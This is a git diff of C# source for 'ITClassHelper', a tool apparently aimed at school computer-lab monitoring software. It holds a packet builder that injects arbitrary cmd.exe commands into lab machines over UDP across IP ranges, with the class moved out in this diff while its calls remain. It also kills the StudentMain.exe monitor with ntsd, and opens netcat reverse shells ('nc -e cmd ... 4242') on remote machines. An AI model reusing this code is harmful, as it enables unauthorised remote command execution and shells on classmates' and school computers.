@@ -1,7 +1,6 @@
 ﻿using Microsoft.VisualBasic;
 using Microsoft.Win32;
 using System;
-using System.Collections;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.Drawing;
@@ -14,7 +13,7 @@ using System.Windows.Forms;
 
 namespace ITClassHelper
 {
-    public partial class MainWindow : Form
+    public partial class FormMain : Form
     {
         public static class ProcessMgr
         {
@@ -129,63 +128,9 @@ namespace ITClassHelper
             }
         }
 
-        public static class PackAttacker
-        {
-            public static byte[] basePack = new byte[]
-            { 0x44, 0x4d, 0x4f, 0x43, 0x00, 0x00, 0x01, 0x00, 0x6e, 0x03, 0x00, 0x00, 0x5b, 0x68, 0x2b, 0x25, 0x6f, 0x61, 0x64, 0x4d, 0xa7, 0x92, 0xf0, 0x47, 0x00, 0xc5, 0xa4, 0x0e, 0x20, 0x4e, 0x00, 0x00, 0xc0, 0xa8, 0x64, 0x86, 0x61, 0x03, 0x00, 0x00, 0x61, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x43, 0x00, 0x3a, 0x00, 0x5c, 0x00, 0x57, 0x00, 0x69, 0x00, 0x6e, 0x00, 0x64, 0x00, 0x6f, 0x00, 0x77, 0x00, 0x73, 0x00, 0x5c, 0x00, 0x73, 0x00, 0x79, 0x00, 0x73, 0x00, 0x74, 0x00, 0x65, 0x00, 0x6d, 0x00, 0x33, 0x00, 0x32, 0x00, 0x5c, 0x00, 0x63, 0x00, 0x6d, 0x00, 0x64, 0x00, 0x2e, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2f, 0x00, 0x63, 0x00, 0x20, 0x00,
-            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-
-            public static byte[] BuildPack(ArrayList pack)
-            {
-                int index = 578;
-                byte[] result = basePack;
-                foreach (int elem in pack)
-                {
-                    result[index] = (byte)elem;
-                    index += 1;
-                }
-                return result;
-            }
-
-            public static ArrayList FormatMsg(string msg)
-            {
-                ArrayList arr = new ArrayList();
-                foreach (char ch in msg)
-                {
-                    string tmp = "0x" + Convert.ToInt32(ch).ToString("X");
-                    int high, low;
-                    if (Convert.ToInt32(tmp, 16) > 0xff)
-                    {
-                        tmp = tmp.Substring(2);
-                        high = Convert.ToInt32(tmp.Substring(0, 2), 16);
-                        low = Convert.ToInt32(tmp.Substring(2, 2), 16);
-                    }
-                    else
-                    {
-                        high = 0;
-                        low = Convert.ToInt32(tmp.Substring(2, 2), 16);
-                    }
-                    arr.Add(low);
-                    arr.Add(high);
-                }
-                return arr;
-            }
-
-            public static void SendPack(string msg, string[] ips, int port)
-            {
-                byte[] finalPack = BuildPack(FormatMsg(msg));
-                Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-                foreach (string ip in ips)
-                {
-                    client.SendTo(finalPack, new IPEndPoint(IPAddress.Parse(ip), port));
-                    Thread.Sleep(1000);
-                }
-                client.Close();
-            }
-        }
-
-        readonly MiniController miniController = new MiniController();
-        static readonly string ProgramVersion = "2.1.0-d";
+        readonly FormController controller = new FormController();
+        FormDeviceManage deviceManage = new FormDeviceManage();
+        static readonly string ProgramVersion = "3.0.0-d";
         static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\ITClassHelper";
         static readonly string ncPath = path + @"\nc.exe";
         static readonly string ntsdPath = path + @"\ntsd.exe";
@@ -195,29 +140,21 @@ namespace ITClassHelper
         static bool firstTimeHide = true;
         static bool firstTimeNcClientAttack = true;
 
-        [DllImport("user32.dll")]
-        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-        [DllImport("user32.dll", EntryPoint = "MoveWindow")]
-        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
-
-        public MainWindow()
+        public FormMain()
         {
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
             ProgramAboutLabel.Text = ProgramAboutLabel.Text.Replace("X.Y.Z", ProgramVersion);
-            miniController.Show();
-            miniController.Hide();
             HotKey.RegisterHotKey(Handle, 100, HotKey.KeyModifiers.Alt, Keys.H);
-            if (ProgramVersion.Contains("-d")) MessageBox.Show("这是一个内测版本，尚不稳定，请小心操作！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+            if (ProgramVersion.Contains("-d")) MessageBox.Show("这是一个实验性版本，尚不稳定，请小心操作！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
         }
 
-        private void MainWindow_Load(object sender, EventArgs e)
+        private void FormMain_Load(object sender, EventArgs e)
         {
             if (Process.GetProcessesByName("ITClassHelper").Length > 1)
             {
                 MessageBox.Show("机房助手已在运行！点击[确认]退出当前进程！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                Environment.Exit(0);
+                Process.GetCurrentProcess().Kill();;
             }
 
             Directory.CreateDirectory(path);
@@ -253,11 +190,11 @@ namespace ITClassHelper
         {
             while (true)
             {
-                IntPtr studentWindow = FindWindow(null, "屏幕演播室窗口");
+                IntPtr studentWindow = Tools.FindWindow(null, "屏幕演播室窗口");
                 if (MousePosition == new Point(0, 0))
                 {
-                    MoveWindow(studentWindow, miniController.Size.Width, miniController.Size.Height, 1000, 500, true);
-                    miniController.Show();
+                    Tools.MoveWindow(studentWindow, controller.Size.Width, controller.Size.Height, 1000, 500, true);
+                    controller.Show();
                 }
                 if (GetStudentProcs().Length == 0)
                 {
@@ -298,27 +235,14 @@ namespace ITClassHelper
             if (GetStudentProcs().Length > 0) ProcessMgr.TerminateProcess(GetStudentProcs()[0].Id);
             if (GetStudentProcs().Length > 0)
             {
-                ExecuteProcess(ntsdPath, "-c q -pn StudentMain.exe");
-                new Thread(x => { Thread.Sleep(1000); ExecuteProcess("taskkill", "/f /im ntsd.exe"); }).Start();
+                Tools.ExecuteProcess(ntsdPath, "-c q -pn StudentMain.exe");
+                new Thread(x => { Thread.Sleep(1000); Tools.ExecuteProcess("taskkill", "/f /im ntsd.exe"); }).Start();
             }
         }
 
         private Process[] GetStudentProcs()
         {
             return Process.GetProcessesByName("StudentMain");
-        }
-
-        private void ExecuteProcess(string process, string arguments, bool noHide = false)
-        {
-            Process ExeProcess = new Process();
-            ProcessStartInfo ExeProcessInfo = new ProcessStartInfo
-            {
-                FileName = process,
-                Arguments = arguments
-            };
-            if (noHide != true) ExeProcessInfo.WindowStyle = ProcessWindowStyle.Hidden;
-            ExeProcess.StartInfo = ExeProcessInfo;
-            ExeProcess.Start();
         }
 
         private void RecoverRoomButton_Click(object sender, EventArgs e) => RecoverRoom();
@@ -328,16 +252,9 @@ namespace ITClassHelper
             if (GetStudentProcs().Length > 0) ProcessMgr.ResumeProcess(GetStudentProcs()[0].Id);
             else
             {
-                if (File.Exists(roomPath)) ExecuteProcess(roomPath, "", true);
+                if (File.Exists(roomPath)) Tools.ExecuteProcess(roomPath, "", true);
                 else { GetRoomPath("manual"); }
             }
-        }
-
-        private void AttackTypeRadio_CheckedChanged(object sender, EventArgs e)
-        {
-            CmdTextBox.Enabled = UseCmdRadio.Checked;
-            ChooseScriptButton.Enabled = UseScriptRadio.Checked;
-            ScripterButton.Enabled = UseScriptRadio.Checked;
         }
 
         private void AttackButton_Click(object sender, EventArgs e)
@@ -346,15 +263,10 @@ namespace ITClassHelper
             int rangeEnd = int.Parse(IPRangeTextBox.Text);
             if (rangeEnd - rangeStart >= 5)
             {
-                if (MessageBox.Show("攻击数量大于或等于 5 个，攻击速度可能较慢！\n按[确定]继续攻击；\n按[取消]放弃攻击。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel)
-                {
-                    AttackButton.Enabled = true;
-                    AttackButton.Text = "立即攻击";
-                    return;
-                }
+                if (MessageBox.Show("攻击数量大于或等于 5 个，攻击速度可能较慢！\n按[确定]继续攻击；\n按[取消]放弃攻击。", "警告", MessageBoxButtons.OKCancel, MessageBoxIcon.Warning) == DialogResult.Cancel) return;
             }
-            AttackButton.Enabled = false;
-            AttackButton.Text = "正在攻击！";
+            AttackProgressBar.Maximum = (rangeEnd - rangeStart + 1) * 10;
+            AttackButton.Text = "攻击中！"; AttackButton.Enabled = false; Cursor = Cursors.WaitCursor;
             for (int curRange = rangeStart; curRange <= rangeEnd; curRange++)
             {
                 if (UseCmdRadio.Checked) PackAttacker.SendPack(CmdTextBox.Text, new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
@@ -370,27 +282,15 @@ namespace ITClassHelper
                     }
                     catch (ArgumentNullException) { MessageBox.Show("未选择脚本！", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error); }
                 }
+                AttackProgressBar.PerformStep();
             }
-            AttackButton.Enabled = true;
-            AttackButton.Text = "立即攻击";
+            AttackProgressBar.Value = 0;
+            AttackButton.Text = "立即攻击"; AttackButton.Enabled = true; Cursor = Cursors.Default;
         }
 
         private void IPButton_Click(object sender, EventArgs e)
         {
-            MessageBox.Show($"IP 地址为：{GetIPAddress()}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
-        }
-
-        private static string GetIPAddress()
-        {
-            string mainAddress = "ERROR";
-            foreach (IPAddress curCheckIP in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
-            {
-                if (curCheckIP.AddressFamily.ToString() == "InterNetwork")
-                {
-                    mainAddress = curCheckIP.ToString();
-                }
-            }
-            return mainAddress;
+            MessageBox.Show($"IP 地址为：{Tools.GetIPAddress()}", "信息", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void DisableAttackButton_Click(object sender, EventArgs e)
@@ -410,8 +310,8 @@ namespace ITClassHelper
             string cpUpdateFiles = $"echo \"复制更新文件......\";cp \".\\ITClassHelper.exe\" \"{Directory.GetCurrentDirectory()}\\ITClassHelper.exe\";cp \".\\PythonInstaller.exe\" \"{Directory.GetCurrentDirectory()}\\PythonInstaller.exe\";cp \".\\TrollScripts.zip\" \"{Directory.GetCurrentDirectory()}\\TrollScripts.zip\"";
             string endMessage = "echo \"更新完成！将在 3 秒后自动关闭。\";sleep 3";
             string arguments = $"{startMessage};{delUpdateFiles};echo \"下载更新文件......\";{dlMainProgram};{dlPyInstaller};{dlTrollScripts};{cpUpdateFiles};{endMessage};";
-            ExecuteProcess("powershell", arguments, true);
-            Environment.Exit(0);
+            Tools.ExecuteProcess("powershell", arguments, true);
+            Process.GetCurrentProcess().Kill();;
         }
 
         private void ChooseScriptButton_Click(object sender, EventArgs e)
@@ -572,7 +472,7 @@ namespace ITClassHelper
             Process[] ncProcs = Process.GetProcessesByName("nc");
             if (ncProcs.Length == 0)
             {
-                ExecuteProcess(ncPath, "-lvnp 4242", true);
+                Tools.ExecuteProcess(ncPath, "-lvnp 4242", true);
                 NcServerButton.Text = "关闭服务器";
             }
             else
@@ -584,10 +484,10 @@ namespace ITClassHelper
 
         private void NcClientButton_Click(object sender, EventArgs e)
         {
-            if (!File.Exists(allowBackdoorFilePath)) ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
+            if (!File.Exists(allowBackdoorFilePath)) Tools.ExecuteProcess(ncPath, $"-e cmd {IPTextBox.Text} 4242");
             else
             {
-                PackAttacker.SendPack($"{ncPath} -e cmd {GetIPAddress()} 4242", new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
+                PackAttacker.SendPack($"{ncPath} -e cmd {Tools.GetIPAddress()} 4242", new string[] { IPTextBox.Text }, int.Parse(PortTextBox.Text));
                 if (firstTimeNcClientAttack == true)
                 {
                     MessageBox.Show("NetCat 客户端只能对一个 IP 地址攻击！", "警告", MessageBoxButtons.OK, MessageBoxIcon.Warning);
@@ -596,7 +496,7 @@ namespace ITClassHelper
             }
         }
 
-        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e)
+        private void FormMain_FormClosing(object sender, FormClosingEventArgs e)
         {
             e.Cancel = true;
             Hide();
@@ -609,7 +509,32 @@ namespace ITClassHelper
 
         private void ExitProgramButton_Click(object sender, EventArgs e)
         {
-            Environment.Exit(0);
+            Process.GetCurrentProcess().Kill();;
+        }
+
+        private void DeviceManageButton_Click(object sender, EventArgs e)
+        {
+            deviceManage.ShowDialog();
+        }
+
+        private void FallbackAttackButton_Click(object sender, EventArgs e)
+        {
+            if (FallbackAttackButton.Text == "回退旧版攻击")
+            {
+                FallbackAttackButton.Text = "回到新版攻击";
+                Height = 557;
+                RoomAttackGroup.BringToFront();
+                RoomAttackGroup.Visible = true;
+                ProgramToolsGroup.Location = new Point(12, 294);
+            }
+            else
+            {
+                FallbackAttackButton.Text = "回退旧版攻击";
+                Height = 347;
+                RoomAttackGroup.SendToBack();
+                RoomAttackGroup.Visible = false;
+                ProgramToolsGroup.Location = new Point(299, 7);
+            }
         }
 
         protected override void WndProc(ref Message msg)
